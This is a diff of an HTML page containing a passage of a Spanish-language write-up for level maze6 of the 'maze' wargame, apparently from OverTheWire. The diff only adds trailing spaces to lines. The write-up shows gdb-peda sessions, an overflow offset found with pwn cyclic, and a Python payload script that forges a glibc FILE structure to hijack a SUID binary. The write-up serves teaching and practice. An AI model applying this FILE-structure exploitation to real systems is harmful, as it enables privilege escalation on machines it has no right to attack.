@@ -667,7 +667,7 @@ epheghuoli
 
   <span class="mtk5">if</span> <span class="mtk1">(argc</span> <span class="mtk5">!=</span> <span class="mtk6">3</span><span class="mtk1">)</span> <span class="mtk1">{</span>
     <span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%s</span> <span class="mtk4">file2write2</span> <span class="mtk4">string</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk5">*</span><span class="mtk1">argv);</span>
-                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>
+                    <span class="mtk3">/*</span> <span class="mtk3">WARNING:</span> <span class="mtk3">Subroutine</span> <span class="mtk3">does</span> <span class="mtk3">not</span> <span class="mtk3">return</span> <span class="mtk3">*/</span>  
     <span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">);</span>
   <span class="mtk1">}</span>
   <span class="mtk1">__stream</span> <span class="mtk5">=</span> <span class="mtk8">fopen</span><span class="mtk1">(argv[</span><span class="mtk6">1</span><span class="mtk1">],</span> <span class="mtk4">"a"</span><span class="mtk1">);</span>
@@ -689,12 +689,12 @@ epheghuoli
 fopen: Permission denied
 <span class="code-green">maze6@maze</span>:<span class="code-blue">~</span>$ cd /tmp
 <span class="code-green">maze6@maze</span>:<span class="code-blue">/tmp</span>$ echo AAAA > asdf.txt
-<span class="code-green">maze6@maze</span>:<span class="code-blue">/tmp</span>$ /maze/maze6 asdf.txt AAAA
+<span class="code-green">maze6@maze</span>:<span class="code-blue">/tmp</span>$ /maze/maze6 asdf.txt AAAA  
 fopen: Permission denied
-</code></pre></div><p>Este comportamiento es extraño. Parece que el programa no tiene los permisos suficientes para escribir datos en <code>asdf.txt</code>. Comprobemos los permisos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">maze6@maze</span>:<span class="code-blue">/tmp</span>$ ls -l --time-style=+ asdf.txt
+</code></pre></div><p>Este comportamiento es extraño. Parece que el programa no tiene los permisos suficientes para escribir datos en <code>asdf.txt</code>. Comprobemos los permisos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">maze6@maze</span>:<span class="code-blue">/tmp</span>$ ls -l --time-style=+ asdf.txt  
 -rw-r--r-- 1 maze6 root 5  asdf.txt
 </code></pre></div><p>Aquí está, como <code>/maze/maze6</code> es un binario SUID, se está ejecutando como usuario <code>maze7</code>, pero el archivo <code>asdf.txt</code> pertenece a <code>maze6</code> y otros solamente pueden leer. Por tanto, Tenemos que cambiar sus permisos para que sean al menos <code>rw</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">maze6@maze</span>:<span class="code-blue">/tmp</span>$ chmod 666 asdf.txt
-<span class="code-green">maze6@maze</span>:<span class="code-blue">/tmp</span>$ ls -l --time-style=+ asdf.txt
+<span class="code-green">maze6@maze</span>:<span class="code-blue">/tmp</span>$ ls -l --time-style=+ asdf.txt  
 -rw-rw-rw- 1 maze6 root 5  asdf.txt
 <span class="code-green">maze6@maze</span>:<span class="code-blue">/tmp</span>$ /maze/maze6 asdf.txt AAAA
 <span class="code-green">maze6@maze</span>:<span class="code-blue">/tmp</span>$ cat asdf.txt
@@ -702,7 +702,7 @@ AAAA
 asdf.txt : kkkk
 </code></pre></div><p>Ahora todo funciona correctamente y podemos empezar a trabajar.</p><p>Para poder resolver este nivel, ponemos un <em>breakpoint</em> antes de <code>fprintf</code> y examinamos la estructura <code>FILE</code> legítima desde la máquina remota. Curiosamente, GDB ha cambiado su interfaz. Esta vez, usaré <code>gdb-peda</code> (solo porque <code>gef</code> no está instalado y <code>pwndbg</code> no funciona correctamente):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">maze6@maze</span>:<span class="code-blue">/tmp</span>$ gdb -q /maze/maze6
 Reading symbols from /maze/maze6...done.
-warning: ~/.gdbinit.local: No such file or directory
+warning: ~/.gdbinit.local: No such file or directory  
 <span class="code-dark-red">gdb$</span> source /usr/local/peda/peda.py
 <span class="code-dark-red">gdb-peda$</span>
 </code></pre></div><p>Desensamblamos la función <code>main</code> y ponemos el <em>breakpoint</em> justo antes de la llamada a <code>fprintf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-red">gdb-peda$</span> disassemble main
@@ -711,7 +711,7 @@ Dump of assembler code for function main:
    0x0804855c &lt;+1&gt;:     mov    ebp,esp
    0x0804855e &lt;+3&gt;:     sub    esp,0x104
    ...
-   0x08048606 &lt;+171&gt;:   call   0x8048420 &lt;fprintf@plt&gt;
+   0x08048606 &lt;+171&gt;:   call   0x8048420 &lt;fprintf@plt&gt;  
    0x0804860b &lt;+176&gt;:   add    esp,0x10
    0x0804860e &lt;+179&gt;:   push   0x0
    0x08048610 &lt;+181&gt;:   call   0x80483f0 &lt;exit@plt&gt;
@@ -720,7 +720,7 @@ End of assembler dump.
 Breakpoint 1 at 0x8048606: file maze6.c, line 40.
 </code></pre></div><p>Ahora podemos lanzar el programa:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-red">gdb-peda$</span> run asdf.txt AAAA
 Starting program: /maze/maze6 asdf.txt AAAA
-<span class="code-dark-blue">[----------------------------------registers-----------------------------------]</span>
+<span class="code-dark-blue">[----------------------------------registers-----------------------------------]</span>  
 <span class="code-dark-green">EAX</span>: <span class="code-dark-blue">0xffffd7cd</span> ("asdf.txt")
 <span class="code-dark-green">EBX</span>: 0x0
 <span class="code-dark-green">ECX</span>: <span class="code-dark-blue">0xffffd4d8</span> --&gt; 0x0
@@ -774,7 +774,7 @@ $1 = {
   _IO_backup_base = 0x0,
   _IO_save_end = 0x0,
   _markers = 0x0,
-  _chain = 0xf7fc5cc0 &lt;_IO_2_1_stderr_&gt;,
+  _chain = 0xf7fc5cc0 &lt;_IO_2_1_stderr_&gt;,  
   _fileno = 0x3,
   _flags2 = 0x0,
   _old_offset = 0x0,
@@ -824,7 +824,7 @@ type = struct _IO_FILE {
     char _unused2[40];
 }
 <span class="code-dark-red">gdb-peda$</span> x/40x 0x804a008
-0x804a008:      0xfbad3484      0x00000000      0x00000000      0x00000000
+0x804a008:      0xfbad3484      0x00000000      0x00000000      0x00000000  
 0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804a038:      0x00000000      0xf7fc5cc0      0x00000003      0x00000000
@@ -862,7 +862,7 @@ arg[1]: <span class="code-dark-green">0x80486bf</span> ("%s : %s\n")
 arg[2]: <span class="code-dark-blue">0xffffd6c3</span> ("asdf.txt")
 arg[3]: <span class="code-dark-blue">0xffffd3c4</span> ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"...)
 <span class="code-dark-blue">[------------------------------------stack-------------------------------------]</span>
-0000| <span class="code-dark-blue">0xffffd3b4</span> ("oaac\277\206\004\b\303\326\377\377\304\323\377\377aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaab"...)
+0000| <span class="code-dark-blue">0xffffd3b4</span> ("oaac\277\206\004\b\303\326\377\377\304\323\377\377aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaab"...)  
 0004| <span class="code-dark-blue">0xffffd3b8</span> --&gt; <span class="code-dark-green">0x80486bf</span> ("%s : %s\n")
 0008| <span class="code-dark-blue">0xffffd3bc</span> --&gt; <span class="code-dark-blue">0xffffd6c3</span> ("asdf.txt")
 0012| <span class="code-dark-blue">0xffffd3c0</span> --&gt; <span class="code-dark-blue">0xffffd3c4</span> ("aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"...)
@@ -875,10 +875,10 @@ Legend: <span class="code-dark-red">code</span>, <span class="code-dark-blue">da
 
 Breakpoint 1, 0x08048606 in main (argc=0x6172, argv=0xffffd564) at maze6.c:40
 40      in maze6.c
-</code></pre></div><p>Y el primer parámetro se sobrescribe con <code>"oaac"</code>, que resulta en un <em>offset</em> de 256 bytes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">pwn</span> cyclic -l oaac
+</code></pre></div><p>Y el primer parámetro se sobrescribe con <code>"oaac"</code>, que resulta en un <em>offset</em> de 256 bytes:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">pwn</span> cyclic -l oaac  
 256
 </code></pre></div><p>Nótese que el patrón se almacena en la pila 16 bytes después del <em>offset</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-red">gdb-peda$</span> x/50x $esp
-0xffffd3b4:     0x6361616f      0x080486bf      0xffffd6c3      0xffffd3c4
+0xffffd3b4:     0x6361616f      0x080486bf      0xffffd6c3      0xffffd3c4  
 0xffffd3c4:     0x61616161      0x61616162      0x61616163      0x61616164
 0xffffd3d4:     0x61616165      0x61616166      0x61616167      0x61616168
 0xffffd3e4:     0x61616169      0x6161616a      0x6161616b      0x6161616c
@@ -895,7 +895,7 @@ Breakpoint 1, 0x08048606 in main (argc=0x6172, argv=0xffffd564) at maze6.c:40
 maze6
 <span class="code-dark-red">gdb-peda$</span> find USER
 Searching for 'USER' in: None ranges
-Found 1 results, display max 1 items:
+Found 1 results, display max 1 items:  
 [stack] : <span class="code-dark-blue">0xffffde6d</span> ("USER=maze6")
 </code></pre></div><p>Por tanto, estos serán los valores para la estructura <code>FILE</code>:</p><ul><li><code>_chain = 0xf7fc5cc0</code></li><li><code>_lock = 0x804a0a0</code></li><li><code>_offset = 0xffffffffffffffff</code></li><li><code>vtable = 0xf7fc3960</code></li><li><code>_IO_buf_base = 0xffffde6d</code></li><li><code>_IO_buf_end = 0xffffde6d + 4</code></li></ul><p>Después de algunas pruebas, podemos desarrollar este <em>script</em> en Python que pone estos campos en un <em>payload</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env</span> <span class="mtk3">python3</span>
 
@@ -922,7 +922,7 @@ Found 1 results, display max 1 items:
 <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span> <span class="mtk5">*</span> <span class="mtk1">(</span><span class="mtk1">length</span> <span class="mtk5">-</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">))</span>
 <span class="mtk1">payload</span> <span class="mtk5">+=</span> <span class="mtk1">p32</span><span class="mtk1">(</span><span class="mtk1">file_addr</span><span class="mtk1">)</span>
 
-<span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk8 mtku">bytes</span><span class="mtk1">(</span><span class="mtk6">42</span> <span class="mtk5">^</span> <span class="mtk1">b</span> <span class="mtk5">for</span> <span class="mtk1">b</span> <span class="mtk5">in</span> <span class="mtk1">payload</span><span class="mtk1">))</span>
+<span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk8 mtku">bytes</span><span class="mtk1">(</span><span class="mtk6">42</span> <span class="mtk5">^</span> <span class="mtk1">b</span> <span class="mtk5">for</span> <span class="mtk1">b</span> <span class="mtk5">in</span> <span class="mtk1">payload</span><span class="mtk1">))</span>  
 </code></pre></div><p>Ahora podemos comprobar que todos los valores cargados son los esperados mirándolo en GDB:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-red">gdb-peda$</span> run asdf.txt "$(python3 maze6.py)"
 Starting program: /maze/maze6 asdf.txt "$(python3 maze6.py)"
 <span class="code-dark-blue">[----------------------------------registers-----------------------------------]</span>  
